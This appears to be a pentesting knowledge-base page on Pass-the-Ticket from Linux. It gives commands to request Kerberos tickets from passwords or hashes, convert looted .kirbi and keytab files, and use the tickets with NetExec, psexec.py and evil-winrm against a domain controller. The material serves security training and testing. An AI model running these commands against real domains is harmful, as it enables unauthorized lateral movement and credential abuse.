---
title: Pass-the-Ticket (from Linux)
slug: pass-the-ticket-linux
area: active-directory
module: 10
order: 2
goal: Use a Kerberos ticket from a Linux attack box (or one looted off a Linux host) to authenticate across the domain.
summary: How to do Pass-the-Ticket from Linux — get a .ccache (from a hash with getTGT, or convert a .kirbi/keytab), point KRB5CCNAME at it, then run Impacket, NetExec and evil-winrm with -k.
prereqs: [A ticket as a .ccache (or a .kirbi / keytab to convert), The DC reachable on 88, Your /etc/krb5.conf set for the realm (or use -k -dc-ip), Clocks within 5 minutes of the DC]
seeAlso: [tool:impacket, tool:netexec, tool:evil-winrm, tool:kerberos-attacks, map:credential-access, map:active-directory]
references:
  - The Hacker Recipes: Kerberos movement | https://www.thehacker.recipes/ad/movement/kerberos/
  - Impacket | https://github.com/fortra/impacket
---

On Linux, Kerberos tools read the ticket from the file named by the `KRB5CCNAME` environment variable. So the whole trick is: get a ticket into a `.ccache` file, export `KRB5CCNAME`, then run tools with `-k` (use Kerberos).

## Get a ticket as a .ccache

From a password or hash, ask the DC for a TGT (over-pass-the-hash with `-hashes`):

```bash
getTGT.py DOMAIN/jsmith:'Winter2026!' -dc-ip DCIP
getTGT.py DOMAIN/jsmith -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -dc-ip DCIP
export KRB5CCNAME=jsmith.ccache
```

Looted a Windows `.kirbi`, or a Linux `/tmp/krb5cc_*` or `.keytab`? Convert it:

```bash
impacket-ticketConverter ticket.kirbi jsmith.ccache     # .kirbi <-> .ccache
KeyTabExtract.py service.keytab                          # pull the hash/key out of a keytab
```

## Use the ticket (Pass-the-Ticket)

```bash
export KRB5CCNAME=jsmith.ccache
klist                                                    # confirm it loaded
nxc smb DC01 --use-kcache
psexec.py -k -no-pass DOMAIN/jsmith@dc01.domain.local
evil-winrm -i dc01.domain.local -r DOMAIN                # -r uses Kerberos
```

## If it fails

- **KRB_AP_ERR_SKEW**: fix the clock — `sudo ntpdate DCIP` or `sudo rdate -n DCIP`.
- **KDC has no support for encryption type**: your `krb5.conf` is forcing a type the DC refuses; let it negotiate, or request an AES key.
- **Kerberos name errors**: always use the **FQDN** (`dc01.domain.local`), never the IP — an IP target silently drops to NTLM.
- **"Password incorrect"-style on `-k`**: `KRB5CCNAME` is unset or points at an expired ticket; re-run `getTGT.py` and re-export.

## Verify

```bash
klist                                                    # shows the principal and expiry
nxc smb DC01 --use-kcache                                # authenticates with the ticket
```
